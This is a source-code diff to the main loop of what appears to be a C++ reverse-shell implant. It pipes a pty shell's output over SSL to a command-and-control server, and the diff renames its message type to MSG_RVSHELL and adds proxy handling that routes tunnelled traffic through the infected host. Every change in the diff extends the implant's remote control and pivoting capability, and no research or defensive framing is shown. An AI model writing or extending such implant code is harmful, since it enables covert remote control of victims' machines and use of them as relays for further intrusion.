@@ -19,6 +19,7 @@
 
 #include "core.h"
 #include "ssl.h"
+#include "proxy.h"
 
 #define DEFAULT_ROWS 25
 #define DEFAULT_COLS 80
@@ -59,6 +60,7 @@ int main(int argc, char **argv) {
     pty_shell shell;
     ssl_transport ssl;
     transport & tpt = ssl;
+    transport_proxy proxy;
     int read_count = 0;
     int write_count = 0;
     int proxy_count = 0;
@@ -109,7 +111,7 @@ int main(int argc, char **argv) {
             // send shell output to c2 server
             int bytes_sent = 0;
             while (bytes_sent < bytes) {
-                message msg(MSG_TTYKEYS, buf + bytes_sent, bytes - bytes_sent);
+                message msg(MSG_RVSHELL, buf + bytes_sent, bytes - bytes_sent);
                 tpt.send(msg);
                 bytes_sent += msg.body_len();
             }
@@ -141,7 +143,7 @@ int main(int argc, char **argv) {
                     break;
                 }
 
-                case MSG_TTYKEYS: { 
+                case MSG_RVSHELL: { 
 
                     // log terminal input to file / stdout
                     LOG("WR: [%04d] %3d '",  write_count++, bytes);
@@ -157,9 +159,13 @@ int main(int argc, char **argv) {
                     break;
                 }
 
-                case MSG_PROXYME: {
+                case MSG_PROXY_INIT:
+                case MSG_PROXY_PASS:
+                case MSG_PROXY_FAIL:
+                case MSG_PROXY_DATA: {
                     LOG("PROXY: [%04d] %d bytes\n", proxy_count++, bytes);
                     hexdump(msg.body(), msg.body_len());
+                    proxy.handle_msg(ssl, msg);
                     break;
                 }
 
@@ -168,6 +174,9 @@ int main(int argc, char **argv) {
                     break;
             }
         }
+
+        // handle proxy traffic routing
+        proxy.poll(ssl);
     }
 
     LOG("info: client exiting\n");
